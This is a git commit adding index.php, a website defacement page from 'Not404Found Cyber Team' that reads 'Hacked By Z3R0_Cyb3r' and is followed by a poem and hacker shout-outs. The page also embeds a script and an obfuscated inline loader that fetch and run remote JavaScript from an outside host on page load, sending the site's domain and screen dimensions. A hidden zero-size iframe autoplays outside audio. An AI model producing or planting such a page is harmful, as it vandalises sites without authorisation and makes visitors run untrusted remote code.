236411a3b27a449d7cec380c5f167375cb59967c
muhamadhzm <44898036+muhamadhzm@users.noreply.github.com>
2018-11-13 22:38:35 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,30 @@
+W<html><head>
+<noscript>Not 404 Found Cyber Team</noscript>
+<title>#Not404Found Cyber Team</title>
+<meta http-equiv="Content-Type" content="text/html; charset=Windows-1254"> <link rel="icon" type="image/png" href="https://1.bp.blogspot.com/-9Z7Vcp_rorU/W5xYpRHwvGI/AAAAAAAAATI/FOQnXSKLMAcUhgOz29_xRrdmy2WD_AlWACLcBGAs/s320/FB_IMG_15369360559647147.jpg" width="200px" height="200px"> 
+ 
+<script type="text/javascript" async="" src="http://p01.notifa.info/3fsmd3/request?id=1&amp;enc=9UwkxLgY9&amp;params=4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdAsWeLQUPPTf9aJV3Ze1jZEK9Ix2K8goeDvrvkE8C7EOF5km6qDoG3Lrx%2baip9KhGTjUQ056DyJHeV5hcBBcocjuLTYWXai6gehdC3HjAfdgUsFODVmuT6IiH7opS53%2bpbXylOGcixfoXu9Bl6HOKg690GgsaI8MNkEDkWb3STUywuCsst7LYaiMX323M%2bgOLVNF2wibw%2brjoZF5McBGINnKVqSdfZJZRL9OP3R%2ftX0P%2f9vLqwMN7LAYdQcSN9iFahCozxTlYe7rYMcS682%2bKTVijYUyWNVqLh5lO6bdIkRxn2PxPtz9oii%2bRsLG1AcPajiycvBaxp6EX%2fwlNhKZRP2Lld3PpJkCUXaYk8yyLA7exr%2boqWlnEKkewTMyAl8w79JH0vHuYds3h43XAAXQdGj1XDIlQ3gfL63NpFrkZyPF762XKaY%2fLU646HoJZnx5sPmV4enqBchCKoCuxr0SyScwa6E7Ra6MhrWV6nric1ITDSAnmEvPVz7p7aNTQ6JeRJESvKk3wfZcDv%2brXChqF0ICkEkKkk490LNB%2b3Qh%2fM5E%3d&amp;idc_r=77899209250&amp;domain=vanryneveld.co.za&amp;sw=1366&amp;sh=768"></script></head>
+<body bgcolor="black"><center>
+
+<br>
+ <img src="https://4.bp.blogspot.com/-DQvRHm0L1TY/W6xLfH0CdEI/AAAAAAAAATs/zo0612LCuzQnvGaSqK8MdG4ek8kfKYvrQCLcBGAs/s320/IMG-20180926-WA0041.jpg" "="" width="320"><br>
+<br>
+<font color="white" style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace; font-size: x-large;"><b>Hacked By Z3R0_Cyb3r  <br><br> WHY?<br>
+
+
+
+Dulu yang kutahu hanya hitam, putih, dan abu-abu
+
+
+
+Hingga akhirnya dia Datang dan Mewarnai Hidpuku</b></font>
+<br>
+
+<font color="white" style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace; font-size: x-large;"><b><br>"Not |404| Found"</b></font>
+<br>
+<font color="white" style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace; font-size: x-large;"><b> </b>
+<br>
+<font color="white" style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace; font-size: x-large;"><b>Thank You: White System'./404 - M.HzMr404 - ZEBEH - VNUXA -  Boltz - Cyrus and you admin<br></b></font><b>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdAsWeLQUPPTf9aJV3Ze1jZEK9Ix2K8goeDvrvkE8C7EOF5km6qDoG3Lrx%2baip9KhGTjUQ056DyJHeV5hcBBcocjuLTYWXai6gehdC3HjAfdgUsFODVmuT6IiH7opS53%2bpbXylOGcixfoXu9Bl6HOKg690GgsaI8MNkEDkWb3STUywuCsst7LYaiMX323M%2bgOLVNF2wibw%2brjoZF5McBGINnKVqSdfZJZRL9OP3R%2ftX0P%2f9vLqwMN7LAYdQcSN9iFahCozxTlYe7rYMcS682%2bKTVijYUyWNVqLh5lO6bdIkRxn2PxPtz9oii%2bRsLG1AcPajiycvBaxp6EX%2fwlNhKZRP2Lld3PpJkCUXaYk8yyLA7exr%2boqWlnEKkewTMyAl8w79JH0vHuYds3h43XAAXQdGj1XDIlQ3gfL63NpFrkZyPF762XKaY%2fLU646HoJZnx5sPmV4enqBchCKoCuxr0SyScwa6E7Ra6MhrWV6nric1ITDSAnmEvPVz7p7aNTQ6JeRJESvKk3wfZcDv%2brXChqF0ICkEkKkk490LNB%2b3Qh%2fM5E%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+<iframe width="0%" height="0" scrolling="no" frameborder="no" allow="autoplay" src="https://instaud.io/_/2Mqp.mp3"></iframe>
+</b></font></center></body></html>
